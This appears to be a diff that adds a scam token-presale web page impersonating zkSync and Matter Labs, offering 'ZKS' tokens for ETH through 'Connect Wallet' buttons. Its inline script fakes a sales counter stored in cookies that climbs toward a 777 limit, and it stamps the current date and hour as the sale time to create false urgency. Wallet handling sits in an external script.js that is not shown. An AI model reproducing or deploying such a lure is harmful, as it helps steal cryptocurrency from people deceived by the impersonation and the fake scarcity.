@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <title>ZKS Presale</title>
+    <link rel="icon" type="image/png" href="https://pbs.twimg.com/profile_images/1228405960835813378/eH3FdBKB_400x400.jpg">
+    <meta content="Introducing the ZKS Native Token" property="og:title">
+    <meta content="#3810ae" data-react-helmet="true" name="theme-color" />
+    <meta content="Welcome to the official presale of zkSync's Native Token (ZKS)." property="og:description">
+    <meta content='https://pbs.twimg.com/profile_images/1228405960835813378/eH3FdBKB_400x400.jpg' property='og:image'>
+    <link href="assets/css/2.ec02d681.chunk.css" rel="stylesheet">
+    <link href="assets/css/main.9cec9eed.chunk.css" rel="stylesheet">
+    <style data-jss="" data-meta="MuiSnackbar">
+      .MuiSnackbar-root {
+        left: 8px;
+        right: 8px;
+        display: flex;
+        z-index: 1400;
+        position: fixed;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .MuiSnackbar-anchorOriginTopCenter {
+        top: 8px;
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginTopCenter {
+          top: 24px;
+          left: 50%;
+          right: auto;
+          transform: translateX(-50%);
+        }
+      }
+
+      .MuiSnackbar-anchorOriginBottomCenter {
+        bottom: 8px;
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginBottomCenter {
+          left: 50%;
+          right: auto;
+          bottom: 24px;
+          transform: translateX(-50%);
+        }
+      }
+
+      .MuiSnackbar-anchorOriginTopRight {
+        top: 8px;
+        justify-content: flex-end;
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginTopRight {
+          top: 24px;
+          left: auto;
+          right: 24px;
+        }
+      }
+
+      .MuiSnackbar-anchorOriginBottomRight {
+        bottom: 8px;
+        justify-content: flex-end;
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginBottomRight {
+          left: auto;
+          right: 24px;
+          bottom: 24px;
+        }
+      }
+
+      .MuiSnackbar-anchorOriginTopLeft {
+        top: 8px;
+        justify-content: flex-start;
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginTopLeft {
+          top: 24px;
+          left: 24px;
+          right: auto;
+        }
+      }
+
+      .MuiSnackbar-anchorOriginBottomLeft {
+        bottom: 8px;
+        justify-content: flex-start;
+      }
+
+      @media (min-width:600px) {
+        .MuiSnackbar-anchorOriginBottomLeft {
+          left: 24px;
+          right: auto;
+          bottom: 24px;
+        }
+      }
+    </style>
+    <style data-jss="" data-meta="MuiCssBaseline">
+      html {
+        box-sizing: border-box;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      *,
+      *::before,
+      *::after {
+        box-sizing: inherit;
+      }
+
+      strong,
+      b {
+        font-weight: 700;
+      }
+
+      body {
+        color: #000;
+        margin: 0;
+        font-size: 0.875rem;
+        font-family: "Roboto", "Helvetica", "Open Sans", sans-serif;
+        font-weight: 400;
+        line-height: 1.43;
+        letter-spacing: 0.01071em;
+        background-color: #303030;
+      }
+
+      @media print {
+        body {
+          background-color: #fff;
+        }
+      }
+
+      body::backdrop {
+        background-color: #303030;
+      }
+
+      .css-pio6kb {
+        display: inline-flex;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        position: relative;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        background-color: transparent;
+        outline: 0px;
+        border: 0px;
+        margin: 0px 16px 0px -12px;
+        cursor: pointer;
+        user-select: none;
+        vertical-align: middle;
+        appearance: none;
+        text-decoration: none;
+        text-align: center;
+        flex: 0 0 auto;
+        font-size: 1.5rem;
+        padding: 8px;
+        border-radius: 50%;
+        overflow: visible;
+        transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        color: inherit;
+      }
+
+      .css-1a1y772 {
+        display: inline-flex;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        position: relative;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        background-color: transparent;
+        outline: 0px;
+        border: 0px;
+        border-top-color: initial;
+        border-top-style: initial;
+        border-top-width: 0px;
+        border-right-color: initial;
+        border-right-style: initial;
+        border-right-width: 0px;
+        border-bottom-color: initial;
+        border-bottom-style: initial;
+        border-bottom-width: 0px;
+        border-left-color: initial;
+        border-left-style: initial;
+        border-left-width: 0px;
+        border-image-source: initial;
+        border-image-slice: initial;
+        border-image-width: initial;
+        border-image-outset: initial;
+        border-image-repeat: initial;
+        margin: 0px 0px 0px -12px;
+        cursor: pointer;
+        user-select: none;
+        vertical-align: middle;
+        appearance: none;
+        text-decoration: none;
+        text-align: center;
+        flex: 0 0 auto;
+        font-size: 1.5rem;
+        padding: 8px;
+        border-radius: 50%;
+        border-top-left-radius: 50%;
+        border-top-right-radius: 50%;
+        border-bottom-right-radius: 50%;
+        border-bottom-left-radius: 50%;
+        overflow: visible;
+        transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        color: inherit;
+      }
+
+      .css-i9gxme {
+        -webkit-box-flex: 1;
+        flex-grow: 1;
+      }
+
+      .css-1a3lqbo {
+        margin: 0px;
+        font-family: Roboto, Helvetica, Open Sans, sans-serif;
+        font-weight: 500;
+        font-size: 1.25rem;
+        line-height: 1.6;
+        letter-spacing: 0.0075em;
+        -webkit-box-flex: 1;
+        flex-grow: 1;
+      }
+
+      .css-1x7skt0 {
+        transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        box-shadow: rgb(0 0 0 / 20%) 0px 2px 4px -1px, rgb(0 0 0 / 14%) 0px 4px 5px 0px, rgb(0 0 0 / 12%) 0px 1px 10px 0px;
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+        box-sizing: border-box;
+        flex-shrink: 0;
+        position: static;
+        background-color: rgb(25, 118, 210);
+        color: rgb(255, 255, 255);
+      }
+
+      .css-191lty2 {
+        position: relative;
+        display: flex;
+        -webkit-box-align: center;
+        align-items: center;
+        padding-left: 16px;
+        padding-right: 16px;
+        min-height: 56px;
+      }
+
+      @media (min-width: 0px) and (orientation: landscape) {
+        .css-191lty2 {
+          min-height: 48px;
+        }
+      }
+
+      @media (min-width: 600px) {
+        .css-191lty2 {
+          min-height: 64px;
+        }
+
+        .css-191lty2 {
+          padding-left: 24px;
+          padding-right: 24px;
+        }
+      }
+
+      .css-pio6kb {
+        display: inline-flex;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        position: relative;
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+        background-color: transparent;
+        outline: 0px;
+        border: 0px;
+        border-top-color: initial;
+        border-top-style: initial;
+        border-top-width: 0px;
+        border-right-color: initial;
+        border-right-style: initial;
+        border-right-width: 0px;
+        border-bottom-color: initial;
+        border-bottom-style: initial;
+        border-bottom-width: 0px;
+        border-left-color: initial;
+        border-left-style: initial;
+        border-left-width: 0px;
+        border-image-source: initial;
+        border-image-slice: initial;
+        border-image-width: initial;
+        border-image-outset: initial;
+        border-image-repeat: initial;
+        margin: 0px 16px 0px -12px;
+        cursor: pointer;
+        user-select: none;
+        vertical-align: middle;
+        appearance: none;
+        text-decoration: none;
+        text-align: center;
+        flex: 0 0 auto;
+        font-size: 1.5rem;
+        padding: 8px;
+        border-radius: 50%;
+        border-top-left-radius: 50%;
+        border-top-right-radius: 50%;
+        border-bottom-right-radius: 50%;
+        border-bottom-left-radius: 50%;
+        overflow: visible;
+        transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        color: inherit;
+      }
+
+      .verify-container {
+        text-align: left;
+      }
+    </style>
+    <style data-emotion="css" data-s=""></style>
+    <link href="assets/css/123123.css" rel="stylesheet" type="text/css" />
+    <link href="assets/css/style321.css" rel="stylesheet" type="text/css" />
+  </head>
+  <body data-aos-easing="ease" data-aos-duration="1000" data-aos-delay="0">
+    <div class="navbar" style="background-color:#0C0E1E">
+      <header style="background: transparent;">
+         <div class="MuiToolbar-root MuiToolbar-gutters MuiToolbar-regular css-191lty2">
+            <div class="MuiTypography-root MuiTypography-h6 css-1a3lqbo">
+               <button class="MuiButtonBase-root MuiIconButton-root MuiIconButton-colorInherit MuiIconButton-edgeStart MuiIconButton-sizeMedium css-pio6kb" tabindex="0" type="button" aria-label="menu"><a href="https://zksync.io/" target="blank"><img src="assets/logo2.png" class="logo" alt="zkSync logo"></a>
+               </button>
+               <a class="MuiTouchRipple-root css-pio6kb navbarbutton" href="https://docs.zksync.io/legal/terms.html" target="blank" style="color:#FFFDFC;text-transform: none;font-size:16px;margin-top: 9px;">Terms of Service</a>
+               <a class="MuiTouchRipple-root css-pio6kb navbarbutton" href="https://docs.zksync.io/legal/privacy.html" target="blank" style="color:#FFFDFC;text-transform: none;font-size:16px;margin-top: 9px;">Privacy Policy</a>
+            </div>
+         </div>
+      </header>
+   </div>
+    <noscript>
+      <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NV8KL9D" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+    </noscript>
+    <div id="root">
+      <div class="MuiContainer-root MuiContainer-maxWidthLg container loader css-1qsxih2" style="height: 0px; transform: matrix(1, 0, 0, 1, 0, -100);"></div>
+      <div class="MuiContainer-root MuiContainer-maxWidthLg verify-container css-1qsxih2">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@700&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap" rel="stylesheet">
+        <div>
+          <div class="wrapper">
+            <div class="next-price-title" style="text-align: left; line-height: 1.5; font-family:Inter, sans-serif;  font-size: 2.5em; font-weight:bold"></div>
+            <div style="clear:both"></div>
+          </div>
+          <div id="Mint-a-Boonji" class="boonji-section-dutch wf-section">
+            <div class="boonjie-container w-container">
+              <div class="w-layout-grid boonjie-hero-two-2">
+                <div class="boonjie-hero-left-3">
+                  <img alt="" src="assets/logo2.png" style="width:215px !important; margin: 0px 0px 25px 0px" />
+                  <div class="next-price-title" style="color: #fff; text-align: left; line-height: 1.5; font-weight: 900;  font-size: 2.5em;">
+                    <b>The Official Presale of <span style="color: #7173EF"> zkSync's Native Token</span>
+                    </b>
+                  </div>
+                  <div class="boonjie-subtitle-cart-copy" style="color: #c7d2da; font-family: 'Open Sans'">June <span id="dateday1" style="font-family: 'Open Sans'"></span>
+                  </div>
+                  <div class="dutch-detail-two-sides">
+                    <div class="dutch-det-left">
+                      <div style="color: #fff">Limited Mint Date</div>
+                    </div>
+                    <div class="dutch-det-right">
+                      <div class="text-block-12" style="font-family:'Open Sans'; color: #c7d2da">June <span id="dateday2"></span>
+                        <span id="datehour1"></span>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="dutch-detail-two-sides">
+                    <div class="dutch-det-left">
+                      <div style="color:#fff">Limit</div>
+                    </div>
+                    <div class="dutch-det-right">
+                      <div  style="font-family:'Open Sans'; color: #c7d2da">777 Individual Addresses</div>
+                    </div>
+                  </div>
+                  <div class="dutch-detail-two-sides">
+                    <div class="dutch-det-left">
+                      <div style="color:#fff">Price</div>
+                    </div>
+                    <div class="dutch-det-right">
+                      <div style="font-family:'Open Sans';color: #c7d2da">0.1 ETH per 50,000 ZKS</div>
+                    </div>
+                  </div>
+                  <div class="dutch-detail-two-sides">
+                    <div class="dutch-det-left">
+                      <div style="color:#fff">Max</div>
+                    </div>
+                    <div class="dutch-det-right">
+                      <div class="text-block-12" style="font-family:'Open Sans';color: #c7d2da">2,500,000 ZKS Per Wallet (5 ETH)</div>
+                    </div>
+                  </div>
+                </div>
+                <div class="boonjie-hero-right">
+                  <div class="exclusive-pre-drop">
+                    <h3 style="font-family:Inter; color:#fff" class="boonjie-h3-4">
+                      <b>$ZKS Token Presale</b>
+                    </h3>
+                    <div class="dutch-prices-div" style="margin-top: 10px;">
+                      <p style="font-family:'Open Sans'; color:#c7d2da" class="boonjie-p-2 mint-time">
+                        <b>
+                          <span style="font-family: 'Open Sans'">Price:</span>
+                        </b>
+                        <span style="font-family: 'Open Sans'" id="price">0.1</span> ETH
+                      </p>
+                    </div>
+                    <div>
+                      <input name="eth" class="eth_input text-field-5 w-input" type="number" min="50000" max="2500000" step="50000" pattern="[A-z0-9]{2,50}" minlength="2" maxlength="50" required="required" value="50000">
+                      <div class="container_metamask_content-btn" style="text-align: center;">
+                        <button style="color:black; font-family:Inter" class="metamask_content-btn connect-button verify-button">Connect Wallet</button>
+                        <div style="display: none;" class="buttonorer">
+                          <h2 class="metamask_content-title"></h2>
+                        </div>
+                      </div>
+                      <div class="container_link_metamask_install-btn" style="text-align: center;">
+                        <a class="link_metamask_install-btn" href="#">
+                          <button class="metamask_install-btn connect-button verify-button glow-button" style="color:white; font-family:'Open Sans'">Connect Wallet </button>
+                        </a>
+                      </div>
+                    </div>
+                    <div class="boonjis-minted-2" style="margin-bottom: 10px;margin-top: 25px;">
+                      <div class="boonji-count-2">
+                        <span class="boonjie-sold-count-2" id="mintnumber" style="color: #fff"></span>
+                      </div>
+                      <div style="color:#222222" class="boonji-count-2">
+                        <span class="boonjie-sold-count-2 right" style="color: #fff"> / 777</span>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="dutch-price-bottom">
+                    <div style="color:#fff" class="next-price-title">Presale Info</div>
+                    <div class="dutch-prices-div">
+                      <p class="next-price-bottom-p" style="margin: 13px auto; color:#000">
+                        <span style="font-weight: 700" class="dark">Network:</span>
+                        <span class="gray" font-family='Open Sans' a>Ethereum</span>
+                      </p>
+                      <p class="next-price-bottom-p" style="color: #C7D2DA">Presale Ends After <span class="dark">
+                          <b>777</b>
+                        </span>
+                        <span style="color: #C7D2DA"> Users Purchase Tokens</span>
+                        <br>
+                        <span style="opacity: 0; height:0;">____________________________________________________</span>
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <script>
+            function writeCookie(name, val, expires) {
+              var date = new Date;
+              date.setDate(date.getDate() + expires);
+              document.cookie = name + "=" + val + "; path=/; expires=" + date.toUTCString();
+            }
+
+            function readCookie(name) {
+              var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
+              return matches ? decodeURIComponent(matches[1]) : undefined;
+            }
+            var mintnumber = Number(readCookie('minted'));
+            if (mintnumber > 0) {
+              writeCookie('status', 'yes', 30);
+              var mintnumber = Number(readCookie('minted'));
+              document.getElementById("mintnumber").innerHTML = mintnumber;
+            } else {
+              var mintnumber = 321;
+              writeCookie('minted', 321, 30);
+            };
+            var interval = setInterval(foo, 4700)
+
+            function foo() {
+              if (mintnumber < 750) {
+                mintnumber = mintnumber + 13;
+                writeCookie('minted', mintnumber, 30);
+                document.getElementById("mintnumber").innerHTML = mintnumber;
+              }
+              if ((mintnumber >= 750) && (mintnumber < 763)) {
+                mintnumber = mintnumber + 3;
+                writeCookie('minted', mintnumber, 30);
+                document.getElementById("mintnumber").innerHTML = mintnumber;
+              }
+              if (mintnumber >= 762) clearInterval(interval);
+            }
+
+            function gettz() {
+              const today = new Date();
+              const short = today.toLocaleDateString(undefined);
+              const full = today.toLocaleDateString(undefined, {
+                timeZoneName: 'short'
+              });
+              const shortIndex = full.indexOf(short);
+              if (shortIndex >= 0) {
+                const trimmed = full.substring(0, shortIndex) + full.substring(shortIndex + short.length);
+                return trimmed.replace(/^[\s,.\-:;]+|[\s,.\-:;]+$/g, '');
+              } else {
+                return full;
+              }
+            }
+            const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+            var datey = new Date(Date.now());
+            var dateyx = datey.toLocaleString('en-US', {
+              timeZone: 'America/New_York'
+            });
+            var datej = new Date(dateyx);
+            var datehour = datej.getHours();
+            var dateday = datej.getDate();
+            datehour = '- ' + ((datehour % 12) || 12).toString() + (datehour >= 12 ? 'pm' : 'am') + ' ' + gettz()
+            document.getElementById("dateday1").innerHTML = dateday;
+            document.getElementById("dateday2").innerHTML = dateday;
+            document.getElementById("datehour1").innerHTML = datehour;
+          </script>
+        </div>
+      </div>
+    </div>
+
+ <span style="color:#8A939F;visibility:visible;position: fixed;left: 50%;bottom: 50px;transform: translate(-50%, -50%);margin: 0 auto;font-size:16px;text-decoration: none;">Made with ❤ by <a href="https://matter-labs.io/" style="color:#8C8DFC">Matter Labs</a></span>
+    <div class="footer-bottom-flex footer-center">
+      <div class="footer-social-links-container">
+        <a href="https://medium.com/matter-labs" target="_blank" class="footer-social-link-2022 github w-inline-block" style="position:relative;top:6.5px;left:3px">
+          <div class="github-icon-embed w-embed">
+             <svg viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+             <path d="M2.311 2.74a.675.675 0 00-.201-.553L.616.284V0h4.638L8.84 8.313 11.992 0h4.422v.284L15.137 1.58a.406.406 0 00-.142.379v9.512a.406.406 0 00.142.38l1.247 1.294v.284H10.11v-.284l1.292-1.326c.127-.134.127-.174.127-.379v-7.69l-3.593 9.648H7.45L3.267 3.75v6.465a.924.924 0 00.232.742l1.68 2.156v.284H.415v-.284l1.68-2.156a.893.893 0 00.217-.742V2.74z" fill="currentColor"></path>
+          </svg>
+          </div>
+       </a>
+         <a href="https://discord.com/invite/px2aR7w" target="_blank" class="footer-social-link-2022 discord w-inline-block">
+            <div class="discord-icon-embed w-embed">
+               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" fill="none">
+                  <path d="M40.3438 13.4219C40.3438 13.4219 40.3438 13.4219 40.2734 13.4219C37.6016 12.1562 34.7891 11.3125 31.9062 10.8203C31.8359 10.75 31.7656 10.8203 31.7656 10.8203C31.3438 11.5234 30.9922 12.2969 30.7109 13C27.5469 12.5078 24.3828 12.5078 21.2188 13C20.9375 12.2969 20.5859 11.5234 20.1641 10.8203C20.1641 10.8203 20.0938 10.75 20.0234 10.8203C17.1406 11.3125 14.3281 12.1562 11.6562 13.4219C11.5859 13.4219 11.5859 13.4219 11.5859 13.4219C6.24219 21.4375 4.76562 29.2422 5.46875 36.9766C5.46875 36.9766 5.46875 37.0469 5.53906 37.0469C8.63281 39.3672 12.1484 41.125 15.875 42.25C15.875 42.3203 15.9453 42.25 16.0156 42.25C16.7891 41.125 17.4922 40 18.125 38.8047C18.125 38.7344 18.125 38.6641 18.0547 38.5938C16.9297 38.1719 15.8047 37.6797 14.8203 37.0469C14.75 37.0469 14.6797 36.9062 14.8203 36.8359C15.0312 36.6953 15.2422 36.5547 15.4531 36.3438C15.4531 36.3438 15.5234 36.3438 15.5938 36.3438C22.3438 39.4375 29.6562 39.4375 36.3359 36.3438C36.4062 36.3438 36.4062 36.3438 36.4766 36.3438C36.6875 36.5547 36.8984 36.6953 37.1094 36.8359C37.1797 36.9062 37.1797 37.0469 37.1094 37.0469C36.0547 37.6797 35 38.1719 33.875 38.5938C33.8047 38.6641 33.8047 38.7344 33.8047 38.8047C34.4375 40 35.1406 41.125 35.9141 42.25C35.9844 42.25 35.9844 42.3203 36.0547 42.25C39.7812 41.125 43.2969 39.3672 46.3906 37.0469C46.4609 37.0469 46.4609 36.9766 46.4609 36.9766C47.3047 28.0469 44.9844 20.3125 40.3438 13.4219ZM19.1094 32.2656C17.0703 32.2656 15.3828 30.3672 15.3828 28.1172C15.3828 25.7969 17.0703 23.9688 19.1094 23.9688C21.2188 23.9688 22.8359 25.7969 22.8359 28.1172C22.8359 30.3672 21.1484 32.2656 19.1094 32.2656ZM32.8203 32.2656C30.7812 32.2656 29.1641 30.3672 29.1641 28.1172C29.1641 25.7969 30.7812 23.9688 32.8203 23.9688C34.9297 23.9688 36.6172 25.7969 36.5469 28.1172C36.5469 30.3672 34.9297 32.2656 32.8203 32.2656Z" fill="currentColor"></path>
+               </svg>
+            </div>
+         </a>&nbsp;
+         <a href="https://t.me/zksync" target="_blank" class="footer-social-link-2022 twitter w-inline-block" style="position:relative;top:2.5px;">
+          <div class="twitter-icon-embed w-embed">
+            <svg width="24px" height="24px" fill="currentColor"><path d="M18.384,22.779c0.322,0.228 0.737,0.285 1.107,0.145c0.37,-0.141 0.642,-0.457 0.724,-0.84c0.869,-4.084 2.977,-14.421 3.768,-18.136c0.06,-0.28 -0.04,-0.571 -0.26,-0.758c-0.22,-0.187 -0.525,-0.241 -0.797,-0.14c-4.193,1.552 -17.106,6.397 -22.384,8.35c-0.335,0.124 -0.553,0.446 -0.542,0.799c0.012,0.354 0.25,0.661 0.593,0.764c2.367,0.708 5.474,1.693 5.474,1.693c0,0 1.452,4.385 2.209,6.615c0.095,0.28 0.314,0.5 0.603,0.576c0.288,0.075 0.596,-0.004 0.811,-0.207c1.216,-1.148 3.096,-2.923 3.096,-2.923c0,0 3.572,2.619 5.598,4.062Zm-11.01,-8.677l1.679,5.538l0.373,-3.507c0,0 6.487,-5.851 10.185,-9.186c0.108,-0.098 0.123,-0.262 0.033,-0.377c-0.089,-0.115 -0.253,-0.142 -0.376,-0.064c-4.286,2.737 -11.894,7.596 -11.894,7.596Z"/></svg>
+          </div>
+       </a>
+         <a href="https://twitter.com/zksync" target="_blank" class="footer-social-link-2022 twitter w-inline-block" style="position:relative;right:5.5px;">
+            <div class="twitter-icon-embed w-embed">
+               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" fill="none">
+                  <path d="M40.2734 19.1875C40.2734 19.5391 40.2734 19.8203 40.2734 20.1719C40.2734 29.9453 32.8906 41.125 19.3203 41.125C15.1016 41.125 11.2344 39.9297 8 37.8203C8.5625 37.8906 9.125 37.9609 9.75781 37.9609C13.2031 37.9609 16.3672 36.7656 18.8984 34.7969C15.6641 34.7266 12.9219 32.6172 12.0078 29.6641C12.5 29.7344 12.9219 29.8047 13.4141 29.8047C14.0469 29.8047 14.75 29.6641 15.3125 29.5234C11.9375 28.8203 9.40625 25.8672 9.40625 22.2812V22.2109C10.3906 22.7734 11.5859 23.0547 12.7812 23.125C10.7422 21.7891 9.47656 19.5391 9.47656 17.0078C9.47656 15.6016 9.82812 14.3359 10.4609 13.2812C14.1172 17.7109 19.6016 20.6641 25.7188 21.0156C25.5781 20.4531 25.5078 19.8906 25.5078 19.3281C25.5078 15.25 28.8125 11.9453 32.8906 11.9453C35 11.9453 36.8984 12.7891 38.3047 14.2656C39.9219 13.9141 41.5391 13.2812 42.9453 12.4375C42.3828 14.1953 41.2578 15.6016 39.7109 16.5156C41.1875 16.375 42.6641 15.9531 43.9297 15.3906C42.9453 16.8672 41.6797 18.1328 40.2734 19.1875Z" fill="currentColor"></path>
+               </svg>
+            </div>
+         </a>
+      </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.5.2/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="script.js"></script>
+  </body>
+</html>
